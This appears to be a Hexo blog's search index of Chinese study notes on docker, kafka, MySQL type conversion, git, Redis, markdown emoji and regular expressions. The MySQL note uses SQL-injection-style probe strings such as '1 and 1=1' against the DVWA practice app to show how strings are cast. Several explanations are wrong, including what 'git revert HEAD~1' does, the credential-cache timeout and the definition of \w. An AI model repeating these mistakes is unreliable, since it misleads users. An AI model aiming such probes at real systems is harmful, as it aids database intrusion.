<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>docker 常用命令</title>
    <url>/2020/07/20/%E5%B7%A5%E5%85%B7/docker/</url>
    <content><![CDATA[<h1>镜像管理</h1>
<h2 id="配置镜像仓库的国内加速地址"><a class="header-anchor" href="#配置镜像仓库的国内加速地址"></a>配置镜像仓库的国内加速地址</h2>
<pre><code class="language-shell"># Ubuntu16.04+、Debian8+、CentOS7适用
# 创建或修改daemon配置文件:/etc/docker/daemon.json,内容如下
{
  &quot;registry-mirrors&quot;: [&quot;https://&lt;个人ID&gt;.mirror.aliyuncs.com&quot;]
}
# 保存文件后，重启服务
sudo systemctl daemon-reload
sudo systemctl restart docker
</code></pre>
<h2 id="从云端镜像仓库获取新镜像"><a class="header-anchor" href="#从云端镜像仓库获取新镜像"></a>从云端镜像仓库获取新镜像</h2>
<pre><code class="language-shell"># 安装最新版镜像
docker pull &lt;镜像名&gt;

# 指定镜像版本安装
docker pull &lt;镜像名&gt;:&lt;镜像版本&gt;
</code></pre>
<h1>容器管理</h1>
<h2 id="从镜像创建并运行一个新容器"><a class="header-anchor" href="#从镜像创建并运行一个新容器"></a>从镜像创建并运行一个新容器</h2>
<pre><code class="language-shell"># 前台运行
docker run &lt;镜像名&gt;

# 后台运行
docker run -d &lt;镜像名&gt;

# 把容器的一个服务端口映射到宿主机上
docker run -p &lt;宿主机端口&gt;:&lt;容器端口&gt; &lt;镜像名&gt;

# 映射多个端口
docker run -p &lt;宿主机端口1&gt;:&lt;容器端口1&gt; \
			-p &lt;宿主机端口2&gt;:&lt;容器端口2&gt; \
			-p &lt;宿主机端口3&gt;:&lt;容器端口3&gt; &lt;镜像名&gt;
			
# 指定容器名
docker run --name &lt;容器名&gt; &lt;镜像名&gt;

# 以交互模式运行,在容器内执行 /bin/bash 命令
docker run -it &lt;镜像名&gt; /bin/bash
</code></pre>
<h2 id="管理已创建的容器"><a class="header-anchor" href="#管理已创建的容器"></a>管理已创建的容器</h2>
<pre><code class="language-shell"># 列出运行中的容器,以下二者都可以
docker container ls
docker ps

# 列出所有已创建的容器，包括停止运行的
docker container ls -a
docker ps -a

# 启动 | 停止 | 重启 | 删除容器
docker [ start | stop | restart | rm ] &lt;容器名或容器ID&gt;

# 重命名容器
docker rename &lt;原容器名&gt; &lt;新容器名&gt;

# 交互模式在容器内执行 /bin/bash 命令
docker run -it &lt;容器名或容器ID&gt; /bin/bash

# 从宿主机拷贝文件或文件夹到容器
docker cp &lt;宿主机中的文件路径&gt; &lt;容器名或容器ID&gt;:&lt;容器内文件路径&gt;

# 从容器拷贝文件或文件夹到宿主机
docker cp &lt;容器名或容器ID&gt;:&lt;容器内文件路径&gt; &lt;宿主机中的文件路径&gt;
</code></pre>
<h1>Docker Compose</h1>
<p>使用 Docker Compose 可以很方便地定义和运行多容器应用程序，通过yml文件即可进行配置。</p>
<pre><code class="language-shell"># 首先移动到docker-compose.yml配置文件所在目录
cd &lt;docker-compose.yml所在目录&gt;

# 前台运行应用程序
docker-compose up

# 后台运行应用程序
docker-compose up -d

# 停止应用程序
docker-compose stop

# 重新启动应用程序
docker-compose restart

# 删除停止运行的容器
docker-compose rm

# 停止运行应用程序并删除对应容器
docker-compose down
</code></pre>
]]></content>
      <categories>
        <category>工具</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>kafka笔记</title>
    <url>/2021/07/23/%E5%B7%A5%E5%85%B7/kafka/</url>
    <content><![CDATA[<h2 id="消息队列模型"><a class="header-anchor" href="#消息队列模型"></a>消息队列模型</h2>
<p>队列模型：最早的模型，消息先进先出，一条消息只能被一个消费者使用</p>
<p><strong>发布-订阅模型</strong>：kafka使用的模型</p>
<p><img src="/2021/07/23/%E5%B7%A5%E5%85%B7/kafka/image-20210714161917846.png" alt="image-20210714161917846"></p>
<h2 id="基本概念"><a class="header-anchor" href="#基本概念"></a>基本概念</h2>
<p><strong>生产者（Producer）</strong>——产生消息的一方</p>
<p><strong>消费者（Consumer）</strong>——处理消息的一方</p>
<p><strong>代理（Broker）</strong>——可以看作是一个独立的 Kafka 实例。多个 Kafka Broker 组成一个 Kafka Cluster（集群）</p>
<p><strong>Topic（主题）</strong> : Producer 将消息发送到特定的主题，Consumer 通过订阅特定的 Topic(主题) 来消费消息。</p>
<p><strong>Partition（分区）</strong> : Partition 属于 Topic 的一部分。一个 Topic 可以有多个 Partition ，并且同一 Topic 下的 Partition 可以分布在不同的 Broker 上，这也就表明一个 Topic 可以横跨多个 Broker 。</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>kafka</tag>
        <tag>消息队列</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql的自动类型转换</title>
    <url>/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<h2 id="一个小特性"><a class="header-anchor" href="#一个小特性"></a>一个小特性</h2>
<p>在查询语句的条件判断子句中，如果等号左右两边的类型不同，则会自动进行类型转换。以如下数据表为例</p>
<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722084058433.png" alt="image-20200722084058433"></p>
<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722082629984.png" alt="image-20200722082629984"></p>
<p><code>DVWA</code>的<code>user</code>表👆</p>
<p>在进行以下查询时结果如图：</p>
<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722082807883.png" alt="image-20200722082807883"></p>
<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722082829117.png" alt="image-20200722082829117"></p>
<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722084904218.png" alt="image-20200722084904218"></p>
<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722084727031.png" alt="image-20200722084727031"></p>
<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722083932481.png" alt="image-20200722083932481"></p>
<p>通过上面几个查询的例子可以看到，mysql查询语句的条件判断中，像user_id = ‘xxx’ 这种条件，user_id 是整型，而 ‘xxx’ 是字符串型，在判断时，'xxx’会被当作一个整型与 user_id进行比较。</p>
<p>而转换的规则也很有意思。</p>
<p>‘1 and 1=1’ 被当作 1</p>
<p>‘1 and 1=2’ 也被当作1</p>
<p>‘2 and 1=1’ 被当作2</p>
<p>经过更多的测试可以发现</p>
<p>这个字符串（不论是单引号或者是双引号）在被当作整型数进行处理的时候</p>
<p>如果第一个字符不是数字，那么该字符串被当成<code>0</code>来处理；</p>
<p>如果第一个字符是数字，那么这个字符串就等于从第一个字符开始的数字串</p>
<p>比如：‘4gsb’ = 4；‘108hh’ = 108</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>git笔记</title>
    <url>/2021/07/26/%E5%B7%A5%E5%85%B7/git/</url>
    <content><![CDATA[<h2 id="总体概览"><a class="header-anchor" href="#总体概览"></a>总体概览</h2>
<p>与svn等集中式版本控制系统不同，git为分布式版本控制系统，每个开发者都保存整个项目的完整镜像</p>
<p><img src="/2021/07/26/%E5%B7%A5%E5%85%B7/git/211915189723300.jpg" alt="211915189723300.jpg"></p>
<p>工作区间: 即我们创建的工程文件， 在编辑器可直观显示；</p>
<p>暂存区: 只能通过git GUI或git shell 窗口显示，提交代码、解决冲突的中转站；</p>
<p>本地仓库: 只能在git shell 窗口显示，连接本地代码跟远程代码的枢纽，不能联网时本地代码可先提交至该处；</p>
<p>远程仓库: 即保存我们代码的服务器，本文以公共版本控制系统：github为例，登录github账号后可直观显示；</p>
<h2 id="Git特点"><a class="header-anchor" href="#Git特点"></a>Git特点</h2>
<p>1.直接记录快照，而非比较差异</p>
<p>​	Git只关心文件数据的整体是否发生变化，而不是文件内容的具体差异。当文件整体发生变化时（比较指纹信息），则记录快照；若文件整体不变，则只保存上一版本快照的索引，避免重复存储。</p>
<p>2.几乎所有操作都是本地执行</p>
<p>​	Git中绝大多数操作都只需要访问本地文件和资源，不用联网。</p>
<p>3.校验和（checksum）为文件的唯一标识</p>
<p>​	一旦文件的完整性收到损坏，那么git就能立刻察觉到。</p>
<p>4.多数操作仅添加数据</p>
<p>​	常用的Git操作大多仅仅是把数据添加到数据库，因为任何一种不可逆的操作（如删除）都会使回退变得更加困难。</p>
<p>5.文件的三种状态*</p>
<p>​	对于任何一个文件，在Git中只有已提交（committed），已修改（modified）和已暂存（staged）三种状态。</p>
<p>​	已提交表示该文件已经被安全地保存在本地数据库；</p>
<p>​	已修改表示修改了某个文件，但还没有提交保存；</p>
<p>​	已暂存表示把已修改的文件放在下次提交时要保存的清单中了</p>
<h2 id="使用方法"><a class="header-anchor" href="#使用方法"></a>使用方法</h2>
<h3 id="获得项目的Git仓库"><a class="header-anchor" href="#获得项目的Git仓库"></a>获得项目的Git仓库</h3>
<h4 id="git-init"><a class="header-anchor" href="#git-init"></a>git init</h4>
<p>要对现有的某个项目开始用 Git 管理，只需到此项目所在的目录，执行：</p>
<pre><code class="language-shell">git init
</code></pre>
<p>初始化后，在当前目录下会出现一个名为 .git 的目录，所有 Git 需要的数据和资源都存放在这个目录中。不过目前，仅仅是按照既有的结构框架初始化好了里边所有的文件和目录，但我们还没有开始跟踪管理项目中的任何一个文件。</p>
<p>如果当前目录下有几个文件想要纳入版本控制，需要先用 git add 命令告诉 Git 开始对这些文件进行跟踪，然后提交：</p>
<pre><code class="language-shell">git add *.c		#把所有的c源码纳入版本控制（加入暂存区）
git add README	#把README加入版本控制（加入暂存区）
git commit -m 'initial project version'		#提交代码到本地仓库
</code></pre>
<h4 id="git-clone"><a class="header-anchor" href="#git-clone"></a>git clone</h4>
<p>git clone用于从服务器上获取git仓库，并且获取的是项目历史的所有数据（每一个文件的每一个版本），服务器上有的数据克隆之后本地也都有了。实际上，即便服务器的磁盘发生故障，用任何一个克隆出来的客户端都可以重建服务器上的仓库，回到当初克隆时的状态。</p>
<pre><code class="language-shell">git clone [url]
</code></pre>
<p>如果希望在克隆的时候，自己定义要新建的项目目录名称，可以在上面的命令末尾指定新的名字：</p>
<pre><code class="language-shell">git clone git://github.com/schacon/grit.git mygrit
</code></pre>
<h3 id="状态检查"><a class="header-anchor" href="#状态检查"></a>状态检查</h3>
<p><strong>查看当前项目的git状态</strong></p>
<pre><code class="language-shell">git status	# 在项目根目录下运行
</code></pre>
<p><strong>对比文件修改情况</strong></p>
<pre><code class="language-shell">git diff
git diff --cached
</code></pre>
<p><code>git diff</code>命令比较的是工作目录中当前文件和暂存区域快照之间的差异，也就是修改之后还没有暂存起来的变化内容</p>
<p>若要看已经暂存起来的文件和上次提交时的快照之间的差异，可以用 <code>git diff --cached</code>（Git 1.6.1 及更高版本还允许使用<code>git diff --staged</code>，效果是相同的，但更好记些。）</p>
<p><strong>查看提交历史</strong></p>
<pre><code class="language-shell">git log [-p] [-2]
# -p 表示展开显示每次提交的内容差异，-2 表示仅展示最近的两次提交
</code></pre>
<p><a href="https://blog.csdn.net/bdss58/article/details/40537859">理解head和master</a></p>
<h3 id="基础配置"><a class="header-anchor" href="#基础配置"></a>基础配置</h3>
<p><strong>查看git配置信息</strong></p>
<pre><code class="language-shell">git config -l # 显示所有当前配置
git config --global -l  # 显示所有全局配置
git config --local -l  # 显示所有当前仓库独有配置
git config --unset user.name # 删除 user.name 配置项
</code></pre>
<p><strong>配置远程地址</strong></p>
<pre><code class="language-shell">git remote add &lt;name&gt; &lt;url&gt;  # 添加远程地址，可添加多个
git remote remove &lt;name&gt; # 删除远程地址
</code></pre>
<p><strong>记住密码</strong></p>
<pre><code class="language-shell">git config credential.helper store # 设置记住密码
git config credential.helper 'cache --timeout 0' # 15min后清除密码
</code></pre>
<h3 id="工作区-暂存区"><a class="header-anchor" href="#工作区-暂存区"></a>工作区&lt;-&gt;暂存区</h3>
<h4 id="git-add"><a class="header-anchor" href="#git-add"></a>git add</h4>
<pre><code class="language-shell">git add [options] [&lt;file&gt;…]
</code></pre>
<p><code>git add</code>是一个多功能命令，它可以将项目文件纳入跟踪范围，也可以将所做的修改暂存到暂存区，<code>git commit</code>只会把已加入暂存区的文件版本提交到本地仓库，所以每对项目文件做一次修改，都要使用git add命令将它加入暂存区，否则提交的可能就是修改之前的版本了。</p>
<h4 id="gitignore"><a class="header-anchor" href="#gitignore"></a>.gitignore</h4>
<p>一般我们总会有些文件无需纳入 Git 的管理，也不希望它们总出现在未跟踪文件列表。通常都是些自动生成的文件，比如日志文件，或者编译过程中创建的临时文件等。我们可以在项目根目录下创建如下一个名为 .gitignore 的文件，列出要忽略的文件模式</p>
<pre><code class="language-text"># 此为注释 – 将被 Git 忽略
*.a       # 忽略所有 .a 结尾的文件
!lib.a    # 但 lib.a 除外
/TODO     # 仅仅忽略项目根目录下的 TODO 文件，不包括 subdir/TODO
build/    # 忽略 build/ 目录下的所有文件
doc/*.txt # 会忽略 doc/notes.txt 但不包括 doc/server/arch.txt
*.[oa]    # 忽略所有以 .o 或 .a 结尾的文件（编译过程文件）
*~        # 忽略所有以波浪符 ~ 结尾的文件（文件副本）
</code></pre>
<blockquote>
<p>文件 .gitignore 的格式规范如下：<br>
所有空行或者以注释符号<code>＃</code>开头的行都会被 Git 忽略。<br>
可以使用标准的 glob 模式匹配。<code> *</code> 匹配模式最后跟反斜杠<code>/</code>说明要忽略的是目录。<br>
要忽略指定模式以外的文件或目录，可以在模式前加上叹号<code>!</code>取反</p>
</blockquote>
<h4 id="git-rm"><a class="header-anchor" href="#git-rm"></a>git rm</h4>
<p><code>git rm &lt;filename&gt;</code>用来将不需要的文件同时从Git仓库和工作目录中删除，如果只是手动从工作目录中删除该文件，则还会在&quot;Changed but not updated&quot;中看到。</p>
<p>如果希望在工作目录中保留文件，只从git仓库中删除，那么可以加上<code>--cached</code>参数</p>
<blockquote>
<p>误删文件恢复（回滚）</p>
</blockquote>
<h4 id="git-mv"><a class="header-anchor" href="#git-mv"></a>git mv</h4>
<p>常用于文件移动和重命名</p>
<pre><code class="language-shell">git mv file_from file_to
</code></pre>
<h4 id="git-restore"><a class="header-anchor" href="#git-restore"></a>git restore</h4>
<pre><code class="language-shell">git restore &lt;file&gt;    # 丢弃工作区的修改（包括对文件自身的操作，如添加文件、删除文件）
git restore --staged &lt;file&gt;    #将暂存区的修改重新放回工作区（包括对文件自身的操作，如添加文件、删除文件）
</code></pre>
<h3 id="暂存区-本地仓库"><a class="header-anchor" href="#暂存区-本地仓库"></a>暂存区&lt;-&gt;本地仓库</h3>
<h4 id="git-commit"><a class="header-anchor" href="#git-commit"></a>git commit</h4>
<p>一般使用<code>git comit -m &quot;your comment&quot;</code>将代码提交到本地仓库，提交后工作区清空，再次修改则需要重新<code>git add</code>，如果不加<code>-m</code>参数，那么会启动文本编辑器以输入本次提交的说明。</p>
<p>每一次运行提交操作，都是对你项目作一次快照，以后可以回到这个状态，或者进行比较。</p>
<p>尽管使用暂存区域的方式可以精心准备要提交的细节，但有时候这么做略显繁琐。Git 提供了一个跳过使用暂存区域的方式，只要在提交的时候，加上<code>-a</code> 选项，Git 就会自动把所有已经跟踪过的文件暂存起来一并提交，从而跳过 <code>git add</code> 步骤。</p>
<h3 id="本地仓库-远程仓库"><a class="header-anchor" href="#本地仓库-远程仓库"></a>本地仓库&lt;-&gt;远程仓库</h3>
<h4 id="git-push"><a class="header-anchor" href="#git-push"></a>git push</h4>
<p>将本地的分支版本上传到远程并合并</p>
<pre><code class="language-shell">git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;
</code></pre>
<h4 id="git-fetch"><a class="header-anchor" href="#git-fetch"></a>git fetch</h4>
<p>从远程仓库下载最新的commit，并且同时保留本地分支head和远程分支remotes，需要另外使用<code>git merge</code>合并分支</p>
<h4 id="git-pull"><a class="header-anchor" href="#git-pull"></a>git pull</h4>
<p>下载远程分支中最新的commit并合并（不建议使用，可能出现未解决代码冲突的情况）</p>
<h3 id="操作撤销"><a class="header-anchor" href="#操作撤销"></a>操作撤销</h3>
<p>在进行文件修改等操作后，使用<code>git status</code>查看状态，可以看到git给出的撤销提示</p>
<p><img src="/2021/07/26/%E5%B7%A5%E5%85%B7/git/image-20210708151055459.png" alt="image-20210708151055459"></p>
<p>更多参考：<a href="https://blog.csdn.net/Sweet_19BaBa/article/details/111950384">git checkout，git restore 和 git reset</a></p>
<h4 id="reset版本回退"><a class="header-anchor" href="#reset版本回退"></a>reset版本回退</h4>
<p>首先<code>git log</code>查看历史提交的版本信息</p>
<p>得到各个commit的id，即其哈希值</p>
<p>使用<code>git reset --hard &lt;commitId&gt;</code>切换到各个版本提交时的状态（清空暂存区），如果版本已提交到远程仓库，则需要在本地仓库回退后使用<code>git push -f</code>将操作强制同步到远程仓库。</p>
<p>但实际上回退之前的版本还是存在的，使用<code>git reflog</code>可以查看历史版本记录，找到已提交过的任何一个版本的commitId，通过commitId仍可以切回最新的未回退的版本。</p>
<h4 id="revert版本回退"><a class="header-anchor" href="#revert版本回退"></a>revert版本回退</h4>
<p>使用git reset回退公共远程分支的版本后，需要其他所有人手动用远程master分支覆盖本地master分支，显然，这不是优雅的回退方法，下面我们使用另个一个命令来回退版本：</p>
<pre><code class="language-shell">git revert HEAD                     //撤销最近一次提交
git revert HEAD~1                   //撤销最近2次提交
git revert 0ffaacc                  //撤销0ffaacc这次提交
</code></pre>
<p>git revert 命令意思是撤销某次提交。它会产生一个新的提交，虽然代码回退了，但是版本依然是向前的，所以，当你用revert回退之后，所有人pull之后，他们的代码也自动的回退了。</p>
<h3 id="分支管理"><a class="header-anchor" href="#分支管理"></a>分支管理</h3>
<h4 id="分支新建、切换、删除"><a class="header-anchor" href="#分支新建、切换、删除"></a>分支新建、切换、删除</h4>
<pre><code class="language-shell">git branch                  #列出已有分支
git branch &lt;branchname&gt;     #创建新分支
git checkout &lt;branchname&gt;   #切换到分支
git branch -d &lt;branchname&gt;  #删除分支
</code></pre>
<p>在一个分支进行文件修改、新建、删除等操作在commit后不会影响其他分支。</p>
<h4 id="分支合并"><a class="header-anchor" href="#分支合并"></a>分支合并</h4>
<pre><code class="language-shell">git merge &lt;branchname&gt;    #把 &lt;branchname&gt; 分支合并到当前分支
</code></pre>
<p>在将<code>branch2</code>合并到<code>branch1</code>的过程中，branch2中新建文件、删除原有文件、修改原有文件等操作将同步到branch1，当两个分支都做出修改时，可能会出现代码冲突，这时候需要我们手动修改解决冲突后再次提交才能合并成功。</p>
<h2 id="常见问题"><a class="header-anchor" href="#常见问题"></a>常见问题</h2>
<ol>
<li>
<p>新建GitHub仓库，第一次push时验证账号密码失败</p>
<p>一开始提示输入GitHub的用户名口令，正确输入后还是验证失败。这时候会出现新的登录窗口，提示通过OpenSSH登录到GitHub，这时候，输入GitHub用户名和access token（settings-developer settings-Personal access tokens）即可登录成功</p>
</li>
<li>
<p>配置免密登录</p>
<p><a href="https://www.cnblogs.com/qishuaiRisen/p/16650513.html">https://www.cnblogs.com/qishuaiRisen/p/16650513.html</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis笔记</title>
    <url>/2022/12/27/%E5%B7%A5%E5%85%B7/redis/</url>
    <content><![CDATA[<h2 id="Redis是什么"><a class="header-anchor" href="#Redis是什么"></a>Redis是什么</h2>
<p>概括地说：Redis是一个内存数据库（in-memory data store，说白话就是所有的数据都在内存里放着，不过有些内存数据库产品如Redis，在关机、断电等特殊情况下会把数据dump到硬盘里以便后续恢复），但又可以当做<strong>缓存</strong>或者<strong>消息中间件</strong>去使用。</p>
<h2 id="Redis怎么用"><a class="header-anchor" href="#Redis怎么用"></a>Redis怎么用</h2>
<h3 id="作为缓存使用"><a class="header-anchor" href="#作为缓存使用"></a>作为缓存使用</h3>
<p>因为Redis的速度很快，所以可以拿他来缓存一些数据库请求数据、复杂的计算结果、API调用结果、用户的会话状态等，从而提高程序的执行速度。</p>
<h3 id="作为消息中间件使用"><a class="header-anchor" href="#作为消息中间件使用"></a>作为消息中间件使用</h3>
<p>在一个异步程序中，有7个线程负责从硬盘的不同目录去取待处理的数据，1个线程去对取来的数据做运算。这时候就可以把Redis当做消息队列来用，取数据的线程把每次取来的数据丢到Redis里面，处理数据的线程只管从Redis里面取数据然后加工，而Redis就起到一个容器+传送带的作用，每个线程都有明确的分工，整个程序的逻辑也更清晰。</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>消息队列</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>在Markdown中使用emoji表情</title>
    <url>/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/</url>
    <content><![CDATA[<h2 id="emoji表情大全"><a class="header-anchor" href="#emoji表情大全"></a>emoji表情大全</h2>
<p><img src="/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/u8SbATtdLwU5VjB.png" alt></p>
<p>理想情况下，在Markdown编辑器中输入如上图所示的语句后将显示对应的emoji表情。但是否显示则取决于你的markdown解析器。</p>
<h2 id="hexo博客使用emoji"><a class="header-anchor" href="#hexo博客使用emoji"></a>hexo博客使用emoji</h2>
<p><strong>hexo</strong> 框架默认的markdown解析器是<code>hexo-renderer-marked</code>，并不支持emoji表情的解析。所以如果想要在博客文章里添加emoji表情😮，可以考虑使用<code>hexo-renderer-markdown-it</code> 解析器。</p>
<p>首先打开Node.js的命令行并移动到你的博客根目录下</p>
<p><img src="/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/jQKAbRWvhGMDFgx.png" alt></p>
<p>卸载原有的<code>hexo-renderer-marked</code>：</p>
<pre><code>npm un hexo-renderer-marked -S
</code></pre>
<p>再安装<code>hexo-renderer-markdown-it</code> ：</p>
<pre><code>npm i hexo-renderer-markdown-it -S
</code></pre>
<p>完成之后安装所需的插件：</p>
<pre><code>npm i markdown-it-emoji -S
</code></pre>
<p>最后打开根目录下的<code>_config.yml</code>文件，添加以下配置：</p>
<pre><code>markdown:
  render:
    html: true # 在 markdown 文本中支持 html tag 标签
    xhtmlOut: false # 需要 xtml 文档，使用 &lt;br /&gt; 替代 &lt;br&gt;
    breaks: true # 用 &lt;br&gt; 开始新的一行
    linkify: true # 自动将 可能是链接的内容转换成链接
    typographer: true # 印刷标识转换
  plugins:
    - markdown-it-emoji # emoji表情插件
    - markdown-it-abbr # 可选
    - markdown-it-footnote # 可选
    - markdown-it-ins # 可选，
    - markdown-it-sub # 可选，下标，如H2O
    - markdown-it-sup # 可选，上标，如2^10
  anchors:
    level: 2
    collisionSuffix: ''
    permalink: false,
    permalinkClass: 'header-anchor'
    permalinkSymbol: ''
    case: 0
    separator: ''
</code></pre>
<p>然后保存退出，再重新加载一下hexo即可。</p>
<pre><code>hexo clean
hexo generate
hexo server
</code></pre>
<p>参考来源： <a href="https://zucchiniy.cn/archives/953e2b.html">ZucchinY的博客</a></p>
]]></content>
      <categories>
        <category>工具</category>
        <category>Markdown</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式笔记</title>
    <url>/2020/04/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
    <content><![CDATA[<h2 id="简介"><a class="header-anchor" href="#简介"></a>简介</h2>
<blockquote>
<p>正则表达式是描述一组字符串特征的模式，用来匹配特定的字符串。 ——Ken Thompson</p>
</blockquote>
<p>一个正则表达式是一串特殊的字符串，它可以用于匹配一组字符串。比如</p>
<pre><code>\d
</code></pre>
<p>就是一个简单的正则表达式，它可以用来匹配0~9范围内的任意<strong>一个数字</strong>。</p>
<pre><code>^(\(\d{3}\)|^\d{3}[.-]?)?\d{3}[.-]?\d{4}$
</code></pre>
<p>而上面这个式子也是一个正则表达式，只不过复杂了一些，它可以匹配10位的北美电话号码。无论区号是否加括号，数字间是否有句点或连字符，它都可以匹配。</p>
<p><strong>学习时用到的工具</strong>：</p>
<p><a href="https://regex101.com/">Regexpal网站</a>：可以在线测试正则表达式</p>
<p>…</p>
<h2 id="基础"><a class="header-anchor" href="#基础"></a>基础</h2>
<h3 id="字符的匹配"><a class="header-anchor" href="#字符的匹配"></a>字符的匹配</h3>
<h4 id="字面值匹配"><a class="header-anchor" href="#字面值匹配"></a>字面值匹配</h4>
<p>最简单的一种，比如一个数字字符串<code>666</code>，可以在目标文本中匹配所有的<code>666</code></p>
<p><img src="/2020/04/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/fN1TQqSlujEPBCy.png" alt></p>
<h4 id="字符组匹配"><a class="header-anchor" href="#字符组匹配"></a>字符组匹配</h4>
<p>正则表达式将方括号<code>[]</code>视为特殊的元字符，因此方括号本身不参与匹配，而对括号内容进行匹配。</p>
<p><code>[0-9]</code>这个正则表达式将会匹配0到9范围内的任意数字。要匹配任意3位数字可以用如下正则表达式</p>
<pre><code>[0-9][0-9][0-9]
</code></pre>
<h4 id="字符组简写式（元字符）"><a class="header-anchor" href="#字符组简写式（元字符）"></a>字符组简写式（元字符）</h4>
<p>例如：<code>[0-9]</code>可以简写为<code>\d</code>，它们都能匹配0到9之间的任意一个数字。</p>
<p>空白字符：</p>
<p><code>\f</code>：换页符</p>
<p><code>\n</code>：换行符</p>
<p><code>\r</code>：回车符</p>
<p><code>\t</code>：制表符（Tab的缩进）</p>
<p><code>\v</code>：垂直制表符</p>
<p><code>\s</code>：任意一个空白字符，等价于 [\f\n\r\t\v]</p>
<p><code>\S</code>：对<code>\s</code>取非，即任意非空字符</p>
<p>数字元字符：</p>
<p><code>\d</code>：匹配任意阿拉伯数字</p>
<p><code>\D</code>：匹配任意非数字字符（如连字符<code>-</code>)</p>
<p>字母数字元字符：</p>
<p><code>\w</code>：大小写字母，下划线和数字，等价于[a-zA-Z0-9]</p>
<p><code>\W</code>：对<code>\w</code>取非</p>
<h4 id="任意字符的匹配"><a class="header-anchor" href="#任意字符的匹配"></a>任意字符的匹配</h4>
<p><code>.</code>：点号（英文句号）可以匹配任意字符（但一般不匹配换行符）。</p>
<p><code>.</code>是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \ 进行转义，即在 . 前面加上<code> \</code> 。</p>
<h3 id="捕获分组和后向引用"><a class="header-anchor" href="#捕获分组和后向引用"></a>捕获分组和后向引用</h3>
<p>将<code>\d</code>放到<code>()</code>中，则<code>\d</code>匹配到一个数字的同时该数字被捕获。捕获之后则可以被后向引用。</p>
<p><code>\1</code>后向引用被捕获的字符。</p>
<p>例如：正则表达式 <code>(\d)\d\1</code>  可以匹配 <code>101</code> 或者 <code>212</code> , <code>383</code> 等等,但无法匹配 <code>102</code> 。因为<code>\1</code>引用的是那个被捕获的字符，所以这个正则表达式匹配到的一定是某三个相连数字，其中第一个数字和第三个数字一定是相同的。</p>
<h3 id="量词"><a class="header-anchor" href="#量词"></a>量词</h3>
<p><code>\d{3}</code>匹配三个相连数字，这里<code>{3}</code>就是一个量词，花括号中可以有多个数字（用逗号<code>,</code>隔开）比如<code>{3,4}</code>表示3个或者4个；</p>
<p><code>\d-?</code>匹配一个数字，如果该数字之后跟着一个连字符那么连字符也会被匹配到。这里的<code>?</code>也是一个量词，表示0个或1个；</p>
<p>同理，其他常用的量词还有</p>
<p><code>+</code>：表示1个或者多个</p>
<p><code>*</code>：表示0个或者多个</p>
<h3 id="括选文字符"><a class="header-anchor" href="#括选文字符"></a>括选文字符</h3>
<p>现在可以看看下面这个比较健壮的表达式了，就是简介中的那个，它匹配10位的北美电话号码</p>
<pre><code>^(\(\d{3}\)|^\d{3}[.-]?)?\d{3}[.-]?\d{4}$
</code></pre>
<p><code>^</code>匹配行起始位置，即<code>^</code>后面跟着的内容<code>(\(\d{3}\)|^\d{3}[.-]?)</code>必须出现在行首；</p>
